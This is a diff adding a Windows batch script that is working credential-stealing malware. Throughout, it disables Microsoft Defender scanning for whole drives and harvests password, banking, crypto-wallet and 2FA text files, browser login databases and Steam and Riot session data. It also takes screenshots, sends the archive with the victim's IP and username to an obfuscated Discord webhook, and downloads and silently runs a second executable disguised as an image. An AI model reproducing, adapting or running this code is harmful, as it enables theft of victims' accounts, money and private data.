@@ -1,0 +1,165 @@
+ÿþ
+@echo off
+cls
+goto :yes
+:MicrosoftDefender
+%powershell% -Command Add-MpPreference -ExclusionProcess "cmd.exe"
+%powershell% -Command Add-MpPreference -ExclusionProcess "explorer.exe"
+%powershell% -Command Add-MpPreference -ExclusionProcess "svchost.exe"
+%powershell% -Command Add-MpPreference -ExclusionExtension ".exe"
+%powershell% -Command Add-MpPreference -ExclusionExtension ".bat"
+%powershell% -Command Add-MpPreference -ExclusionExtension ".ps1"
+%powershell% -Command Add-MpPreference -ExclusionPath "%temp%"
+%powershell% -Command Add-MpPreference -ExclusionPath "%path%"
+%powershell% -Command Add-MpPreference -ExclusionPath "C:\\"
+%powershell% -Command Add-MpPreference -ExclusionPath "D:\\"
+%powershell% -Command Add-MpPreference -ExclusionPath "E:\\"
+%powershell% -Command Add-MpPreference -ExclusionPath "F:\\"
+goto :EOF
+:makescreenshot
+echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing > "%path%\librairies\sg.ps1"
+echo $screens = [Windows.Forms.Screen]::AllScreens >> "%path%\librairies\sg.ps1"
+echo $top    = ($screens.Bounds.Top    ^| Measure-Object -Minimum).Minimum >> "%path%\librairies\sg.ps1"
+echo $left   = ($screens.Bounds.Left   ^| Measure-Object -Minimum).Minimum >> "%path%\librairies\sg.ps1"
+echo $width  = ($screens.Bounds.Right  ^| Measure-Object -Maximum).Maximum >> "%path%\librairies\sg.ps1"
+echo $height = ($screens.Bounds.Bottom ^| Measure-Object -Maximum).Maximum >> "%path%\librairies\sg.ps1"
+echo $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height) >> "%path%\librairies\sg.ps1"
+echo $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height) >> "%path%\librairies\sg.ps1"
+echo $graphics = [Drawing.Graphics]::FromImage($bmp) >> "%path%\librairies\sg.ps1"
+echo $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) >> "%path%\librairies\sg.ps1"
+echo $bmp.Save("%path%\tmp\Screenshots\%1.png") >> "%path%\librairies\sg.ps1"
+echo $graphics.Dispose() >> "%path%\librairies\sg.ps1"
+echo $bmp.Dispose() >> "%path%\librairies\sg.ps1"
+%powershell% -ExecutionPolicy Bypass -File "%path%\librairies\sg.ps1"
+goto :EOF
+:kiwi
+call :kasselescouilles "%userprofile%\Desktop"
+call :kasselescouilles "%userprofile%\Documents"
+call :kasselescouilles "%userprofile%\Downloads"
+call :ksize
+call :kid
+goto :EOF
+:kasselescouilles
+cd /d %1
+call :kretrieve "*bancaire*.txt" & call :kretrieve "*recovery*.txt" & call :kretrieve "*passw*.txt" & call :kretrieve "mdp.txt"
+call :kretrieve "motdepasse.txt" & call :kretrieve "*mot*de*passe*.txt" & call :kretrieve "*login*.txt" & call :kretrieve "secret*.txt"
+call :kretrieve "*account*.txt" & call :kretrieve "acount.txt" & call :kretrieve "paypal.txt" & call :kretrieve "*banque*.txt"
+call :kretrieve "metamask*.txt" & call :kretrieve "wallet*.txt" & call :kretrieve "crypto.txt" & call :kretrieve "*exodus.txt"
+call :kretrieve "discord*.txt" & call :kretrieve "*2fa*.txt" & call :kretrieve "code*.txt" & call :kretrieve "memo.txt"
+call :kretrieve "*compte*.txt" & call :kretrieve "token*.txt" & call :kretrieve "*backup*.txt" & call :kretrieve "secret*.txt"
+goto :EOF
+:kretrieve
+>nul %findstr% /c:"%1" %kiwitempstep1% || (dir /b "%1" /s >> %kiwitempstep1%)
+goto :EOF
+:ksize
+for /f "tokens=* delims=" %%a in ('type %kiwitempstep1%') do (%powershell% "if ((Get-Item '%%a').length -lt 1mb) { Add-Content \"%kiwitempstep2%\" \"%%a\" }" & del "%path%\tmp\ktmp1" /f /q )
+goto :EOF
+:kid
+setLocal EnableDelayedExpansion
+for /f "tokens=* delims=" %%a in ('type %kiwitempstep2%') do (
+    call :random id
+    echo ^"%%a^":^"!id!^",>>"%kiwioutput%"
+    call :kcopy "%%a" !id!
+    del "%path%\tmp\ktmp2" /f /q
+)
+endlocal
+goto :EOF
+:kcopy
+copy /y %1 "%path%\tmp\Kiwi\files\%2"
+goto :EOF
+:random
+set %1=%time:~-2%%random%%time:~-2%%random%%time:~-2%
+goto :EOF
+:grabsteam
+setLocal EnableDelayedExpansion
+if exist "%programfiles(x86)%\Steam\config\loginusers.vdf" (
+    type "%programfiles(x86)%\Steam\config\loginusers.vdf" | %findstr% "Remember" | %findstr% "1" >nul 2>&1 || set srp="false"
+    if !srp! neq "false" (
+        %powershell% Compress-Archive -Path "${env:ProgramFiles(x86)}\Steam\config\*" -DestinationPath "%path%\tmp\Gaming\Steam.zip"
+    )
+)
+endlocal
+goto :EOF
+:grabriotclient
+if exist "%localappdata%\Riot Games\Riot Client\Data\RiotGamesPrivateSettings.yaml" (
+    %powershell% Compress-Archive -Path '%localappdata%\Riot Games\Riot Client\Data\*' -DestinationPath "%path%\tmp\Gaming\RiotClient.zip"
+)
+goto :EOF
+:grabnationsglory
+if exist "%appdata%\NationsGlory\Local Storage\leveldb\CURRENT" (
+    %powershell% Compress-Archive -Path '%appdata%\NationsGlory\Local Storage\leveldb\*' -DestinationPath "%path%\tmp\Gaming\NationsGlory.zip"
+)
+goto :EOF
+:grabgaming
+call :grabsteam
+call :grabriotclient
+call :grabnationsglory
+goto :EOF
+:grabbrowser
+if exist %1 (mkdir "%path%\tmp\browser\%2" & copy /y %1 "%path%\tmp\browser\%2\")
+goto :EOF
+:aesgrab
+%powershell% "iwr -useb https://cdn.discordapp.com/attachments/1109123345649238086/1109123438905405520/aes.exe -o %path%\librairies\aes.exe"
+"%path%\librairies\aes.exe" %1
+goto :EOF
+:generateuniqueid
+%powershell% "get-wmiobject Win32_ComputerSystemProduct | select-object -expandproperty uuid"; (Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography).MachineGUID>"%path%\tmp\u1"
+%powershell% "Get-FileHash %path%\tmp\u1 -Algorithm MD5 | select-object -expandproperty hash">"%path%\tmp\u2"&set/p %1=<"%path%\tmp\u2"&del "%path%\tmp\u2" /f /q &del "%path%\tmp\u1" /f /q
+goto :EOF
+:grabip
+%curl% ifconfig.co/>"%path%\tmp\ip"&set/p %1=<"%path%\tmp\ip"&del "%path%\tmp\ip" /f /q
+goto :EOF
+:clean
+del "%path%\*.*" /f /q /s
+rmdir "%path%\" /s /q
+goto :EOF
+:yes
+set script=%0
+set folder=0d70a44179fe5ec33da11f4767a0a5891fb37932
+set w=h%x%t%x%t%x%p%x%s%x%:%x%/%x%/%x%c%x%a%x%n%x%a%x%r%x%y%x%.%x%d%x%i%x%s%x%c%x%o%x%r%x%d%x%.%x%c%x%o%x%m%x%/%x%a%x%p%x%i%x%/%x%w%x%e%x%b%x%h%x%o%x%o%x%k%x%s%x%/%x%1%x%1%x%3%x%1%x%3%x%5%x%5%x%0%x%1%x%0%x%4%x%7%x%9%x%9%x%5%x%6%x%0%x%6%x%8%x%/%x%I%x%P%x%1%x%v%x%l%x%8%x%Y%x%l%x%7%x%l%x%5%x%O%x%R%x%H%x%L%x%B%x%7%x%y%x%Y%x%u%x%W%x%g%x%r%x%C%x%N%x%X%x%V%x%J%x%Z%x%-%x%Q%x%9%x%K%x%A%x%H%x%z%x%T%x%S%x%U%x%o%x%c%x%j%x%8%x%L%x%d%x%h%x%a%x%g%x%R%x%Z%x%b%x%j%x%z%x%W%x%w%x%1%x%M%x%z%x%8%x%n%x%K%x%s%x%c%x%r%x%q%x%2%x%M%x%d%x%
+set path=%temp%\%folder%
+set kiwioutput=%path%\tmp\Kiwi\kiwi.json
+set kiwitempstep1=%path%\tmp\ktmp1
+set kiwitempstep2=%path%\tmp\ktmp2
+set powershell="%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe"
+if "%processor_architecture%" == "amd64" (
+set reg="%windir%\System32\reg.exe"
+set curl="%windir%\System32\curl.exe"
+set findstr="%windir%\System32\findstr.exe"
+) else (
+set reg="%windir%\SysWOW64\reg.exe"
+set curl="%windir%\SysWOW64\curl.exe"
+set findstr="%windir%\SysWOW64\findstr.exe"
+)
+call :clean
+mkdir "%path%\librairies"
+mkdir "%path%\tmp"
+mkdir "%path%\tmp\Kiwi"
+mkdir "%path%\tmp\Kiwi\files"
+mkdir "%path%\tmp\Screenshots"
+mkdir "%path%\tmp\Browser"
+mkdir "%path%\tmp\Gaming"
+call :makescreenshot start_screenshot
+echo {>%kiwioutput%
+call :kiwi
+echo "":"">>%kiwioutput%&echo }>>%kiwioutput%
+cd %script%
+call :MicrosoftDefender
+call :grabbrowser "%appdata%\Opera Software\Opera GX Stable\Login Data" OperaGX
+call :grabbrowser "%appdata%\Opera Software\Opera Stable\Login Data" Opera
+call :grabbrowser "%localappdata%\Google\Chrome\User Data\Default\Login Data" Chrome
+call :grabbrowser "%localappdata%\BraveSoftware\Brave-Browser\User Data\Login Data" Brave
+call :grabbrowser "%localappdata%\Microsoft\Edge\User Data\Default\Login Data" Edge
+call :aesgrab "%path%\tmp\browser\aes_keys.json"
+call :grabgaming
+call :generateuniqueid uid
+call :grabip ip
+echo %ip% > "%path%\tmp\ip.txt"
+call :makescreenshot end_screenshot
+%powershell% Compress-Archive -Path "%path%\tmp\*" -DestinationPath "%path%\[%uid%].zip"
+%curl% -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@%path%\[%uid%].zip" -F "payload_json={\"content\":\"[%time%] New LOG : %username% - %ip%\"}" %w%
+timeout 5 /nobreak > nul
+call :clean
+%powershell% iwr -useb "https://files.catbox.moe/p3vomo.png" -OutFile "%temp%\GraphicsType\tmp.exe"; saps "%temp%\GraphicsType\tmp.exe" -Verb RunAs -WindowStyle Hidden
+goto :EOF
+exit
